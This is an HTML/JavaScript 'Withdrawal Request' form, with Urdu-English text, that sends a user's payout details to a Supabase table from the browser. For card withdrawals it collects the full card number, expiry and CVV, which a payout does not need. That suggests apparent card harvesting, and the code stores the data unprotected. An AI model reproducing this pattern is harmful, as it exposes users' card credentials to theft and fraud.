<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Withdrawal Request</title>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <style>
        * {
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            padding: 0;
        }

        body {
            background-color: #f4f7f6;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            background-color: white;
            width: 100%;
            max-width: 500px;
            border-radius: 15px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
            padding: 25px;
        }

        h2 {
            text-align: center;
            color: #333;
            margin-bottom: 20px;
            font-size: 24px;
        }

        .form-group {
            margin-bottom: 15px;
        }

        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: #555;
            font-size: 14px;
        }

        input, select {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 14px;
            outline: none;
            transition: border 0.3s;
        }

        input:focus, select:focus {
            border-color: #007bff;
        }

        .payment-options {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 10px;
            margin-top: 10px;
        }

        .payment-card {
            border: 2px solid #eee;
            border-radius: 10px;
            padding: 10px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            transition: all 0.2s;
            background: #fafafa;
        }

        .payment-card:hover {
            border-color: #007bff;
            background: #f0f8ff;
        }

        .payment-card.selected {
            border-color: #007bff;
            background: #e6f2ff;
            box-shadow: 0 0 5px rgba(0,123,255,0.3);
        }

        .payment-card svg {
            width: 50px;
            height: 32px;
            margin-bottom: 5px;
        }

        .payment-card span {
            font-size: 12px;
            font-weight: 600;
            color: #444;
            text-align: center;
        }

        .btn-submit {
            width: 100%;
            padding: 14px;
            background-color: #28a745;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 20px;
            transition: background 0.3s;
        }

        .btn-submit:hover {
            background-color: #218838;
        }

        .btn-submit:disabled {
            background-color: #94d3a2;
            cursor: not-allowed;
        }

        .success-msg {
            display: none;
            text-align: center;
            padding: 20px;
            background: #d4edda;
            color: #155724;
            border-radius: 8px;
            margin-top: 20px;
        }

        .error-msg {
            display: none;
            padding: 12px;
            background: #f8d7da;
            color: #721c24;
            border-radius: 8px;
            margin-top: 10px;
            font-size: 14px;
        }

        .loader {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 2px solid #fff;
            border-top-color: transparent;
            border-radius: 50%;
            animation: spin 0.7s linear infinite;
            margin-right: 6px;
            vertical-align: middle;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

<div class="container">
    <h2>Withdrawal Request</h2>

    <form id="withdrawForm">
        <div class="form-group">
            <label for="country">Select Country</label>
            <select id="country" required>
                <option value="">-- Select Country --</option>
                <option value="pakistan">Pakistan</option>
                <option value="other">Other Country (International)</option>
            </select>
        </div>

        <div class="form-group">
            <label>Select Payment Method</label>
            <div id="paymentMethodsContainer" class="payment-options"></div>
        </div>

        <div id="dynamicFields"></div>

        <div class="form-group" style="margin-top: 20px; border-top: 1px solid #eee; padding-top: 15px;">
            <label for="amount">Amount</label>
            <input type="number" id="amount" placeholder="Enter amount" min="1" step="0.01" required>

            <label for="contactEmail" style="margin-top: 10px;">Email Address</label>
            <input type="email" id="contactEmail" placeholder="Enter your email" required>

            <label for="contactPhone" style="margin-top: 10px;">Contact Number</label>
            <input type="text" id="contactPhone" placeholder="Enter your contact number" required>
        </div>

        <button type="submit" class="btn-submit" id="submitBtn">Request Send Karein</button>
        <div id="errorMessage" class="error-msg"></div>
    </form>

    <div id="successMessage" class="success-msg">
        <h3>Shukriya!</h3>
        <p>Aapki withdrawal request send kar di gayi hai. Admin jald approve karega.</p>
    </div>
</div>

<script>
    // ============ SUPABASE CONFIG ============
    // Yahan apna URL aur Key dalein
    const SUPABASE_URL = "https://dxzdmmzfopbljmivfkqx.supabase.co";
    const SUPABASE_ANON_KEY = "sb_publishable_hWPT7SK9NhIKadJjkuyu-Q_m4OZMeiL";

    const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
    // =========================================

    // Inline SVG Logos (offline, foran load hongi)
    const logos = {
        jazzcash: `<svg viewBox="0 0 80 40"><rect width="80" height="40" rx="6" fill="#E4002B"/><text x="40" y="26" font-family="Arial" font-size="13" font-weight="bold" fill="white" text-anchor="middle">JazzCash</text></svg>`,
        easypaisa: `<svg viewBox="0 0 80 40"><rect width="80" height="40" rx="6" fill="#00A651"/><text x="40" y="26" font-family="Arial" font-size="12" font-weight="bold" fill="white" text-anchor="middle">EasyPaisa</text></svg>`,
        mastercard: `<svg viewBox="0 0 80 40"><rect width="80" height="40" rx="6" fill="#1A1F71"/><circle cx="30" cy="20" r="10" fill="#EB001B"/><circle cx="50" cy="20" r="10" fill="#F79E1B" opacity="0.85"/></svg>`,
        bank: `<svg viewBox="0 0 80 40"><rect width="80" height="40" rx="6" fill="#0B5ED7"/><path d="M40 10 L60 20 L20 20 Z" fill="white"/><rect x="25" y="22" width="6" height="10" fill="white"/><rect x="37" y="22" width="6" height="10" fill="white"/><rect x="49" y="22" width="6" height="10" fill="white"/></svg>`,
        binance: `<svg viewBox="0 0 80 40"><rect width="80" height="40" rx="6" fill="#F0B90B"/><text x="40" y="26" font-family="Arial" font-size="12" font-weight="bold" fill="#1E2026" text-anchor="middle">Binance</text></svg>`,
        paypal: `<svg viewBox="0 0 80 40"><rect width="80" height="40" rx="6" fill="#003087"/><text x="40" y="26" font-family="Arial" font-size="13" font-weight="bold" fill="white" text-anchor="middle">PayPal</text></svg>`,
        payoneer: `<svg viewBox="0 0 80 40"><rect width="80" height="40" rx="6" fill="#FF4800"/><text x="40" y="26" font-family="Arial" font-size="11" font-weight="bold" fill="white" text-anchor="middle">Payoneer</text></svg>`
    };

    const paymentData = {
        pakistan: [
            { id: 'jazzcash', name: 'JazzCash', logo: logos.jazzcash },
            { id: 'easypaisa', name: 'EasyPaisa', logo: logos.easypaisa },
            { id: 'mastercard', name: 'MasterCard', logo: logos.mastercard },
            { id: 'bank', name: 'Bank Transfer', logo: logos.bank }
        ],
        other: [
            { id: 'binance', name: 'Binance', logo: logos.binance },
            { id: 'paypal', name: 'PayPal', logo: logos.paypal },
            { id: 'payoneer', name: 'Payoneer', logo: logos.payoneer },
            { id: 'mastercard_int', name: 'MasterCard', logo: logos.mastercard }
        ]
    };

    const countrySelect = document.getElementById('country');
    const paymentContainer = document.getElementById('paymentMethodsContainer');
    const dynamicFields = document.getElementById('dynamicFields');
    const form = document.getElementById('withdrawForm');
    const successMsg = document.getElementById('successMessage');
    const errorMsg = document.getElementById('errorMessage');
    const submitBtn = document.getElementById('submitBtn');

    let selectedMethod = null;

    countrySelect.addEventListener('change', function() {
        const country = this.value;
        paymentContainer.innerHTML = '';
        dynamicFields.innerHTML = '';
        selectedMethod = null;

        if (!country) return;

        paymentData[country].forEach(method => {
            const div = document.createElement('div');
            div.className = 'payment-card';
            div.dataset.id = method.id;
            div.innerHTML = `${method.logo}<span>${method.name}</span>`;
            div.addEventListener('click', function() {
                document.querySelectorAll('.payment-card').forEach(c => c.classList.remove('selected'));
                this.classList.add('selected');
                selectedMethod = method.id;
                renderFields(method.id);
            });
            paymentContainer.appendChild(div);
        });
    });

    function renderFields(methodId) {
        const holderNameField = `
            <div class="form-group">
                <label>Account Holder Name</label>
                <input type="text" id="holderName" placeholder="Enter account holder name" required>
            </div>`;

        let html = '';
        if (methodId === 'jazzcash' || methodId === 'easypaisa') {
            html = `
                <div class="form-group">
                    <label>Mobile Number (${methodId === 'jazzcash' ? 'JazzCash' : 'EasyPaisa'})</label>
                    <input type="text" id="mobileNumber" placeholder="03XXXXXXXXX" required>
                </div>${holderNameField}`;
        } else if (methodId === 'bank') {
            html = `
                <div class="form-group">
                    <label>IBAN Number</label>
                    <input type="text" id="iban" placeholder="PKXXXXXXXXXXXXX" required>
                </div>${holderNameField}`;
        } else if (methodId === 'mastercard' || methodId === 'mastercard_int') {
            html = `
                <div class="form-group">
                    <label>Card Number</label>
                    <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" required>
                </div>
                <div style="display: flex; gap: 10px;">
                    <div class="form-group" style="flex: 1;">
                        <label>Expiry Date</label>
                        <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" required>
                    </div>
                    <div class="form-group" style="flex: 1;">
                        <label>CVV</label>
                        <input type="password" id="cvv" placeholder="123" maxlength="4" required>
                    </div>
                </div>${holderNameField}`;
        } else if (methodId === 'binance') {
            html = `
                <div class="form-group">
                    <label>Binance Wallet Address / ID</label>
                    <input type="text" id="binanceId" placeholder="Enter Binance ID or Wallet Address" required>
                </div>${holderNameField}`;
        } else if (methodId === 'paypal') {
            html = `
                <div class="form-group">
                    <label>PayPal Email</label>
                    <input type="email" id="paypalEmail" placeholder="Enter PayPal email" required>
                </div>${holderNameField}`;
        } else if (methodId === 'payoneer') {
            html = `
                <div class="form-group">
                    <label>Payoneer Email / Account ID</label>
                    <input type="text" id="payoneerId" placeholder="Enter Payoneer email or ID" required>
                </div>${holderNameField}`;
        }
        dynamicFields.innerHTML = html;
    }

    // ============ FORM SUBMIT → SUPABASE ============
    form.addEventListener('submit', async function(e) {
        e.preventDefault();
        errorMsg.style.display = 'none';

        if (!selectedMethod) {
            alert('Please select a payment method first.');
            return;
        }

        // Account details collect karen
        const details = {};
        const holderName = document.getElementById('holderName')?.value || '';

        if (selectedMethod === 'jazzcash' || selectedMethod === 'easypaisa') {
            details.mobile_number = document.getElementById('mobileNumber').value;
        } else if (selectedMethod === 'bank') {
            details.iban = document.getElementById('iban').value;
        } else if (selectedMethod === 'mastercard' || selectedMethod === 'mastercard_int') {
            details.card_number = document.getElementById('cardNumber').value;
            details.expiry = document.getElementById('expiry').value;
            details.cvv = document.getElementById('cvv').value;
        } else if (selectedMethod === 'binance') {
            details.binance_id = document.getElementById('binanceId').value;
        } else if (selectedMethod === 'paypal') {
            details.paypal_email = document.getElementById('paypalEmail').value;
        } else if (selectedMethod === 'payoneer') {
            details.payoneer_id = document.getElementById('payoneerId').value;
        }

        const payload = {
            country: countrySelect.value,
            payment_method: selectedMethod,
            account_details: details,
            holder_name: holderName,
            amount: parseFloat(document.getElementById('amount').value) || 0,
            email: document.getElementById('contactEmail').value,
            contact_phone: document.getElementById('contactPhone').value,
            status: 'pending'
        };

        // Button loading state
        submitBtn.disabled = true;
        submitBtn.innerHTML = '<span class="loader"></span> Sending...';

        const { data, error } = await supabaseClient
            .from('withdrawal_requests')
            .insert([payload]);

        if (error) {
            console.error('Supabase Error:', error);
            errorMsg.textContent = 'Error: ' + error.message;
            errorMsg.style.display = 'block';
            submitBtn.disabled = false;
            submitBtn.textContent = 'Request Send Karein';
            return;
        }

        form.style.display = 'none';
        successMsg.style.display = 'block';
    });

    // Input formatting
    document.addEventListener('input', function(e) {
        if (e.target.id === 'cardNumber') {
            let val = e.target.value.replace(/\D/g, '');
            val = val.replace(/(.{4})/g, '$1 ').trim();
            e.target.value = val;
        }
        if (e.target.id === 'expiry') {
            let val = e.target.value.replace(/\D/g, '');
            if (val.length >= 2) val = val.substring(0,2) + '/' + val.substring(2,4);
            e.target.value = val;
        }
    });
</script>

</body>
</html>
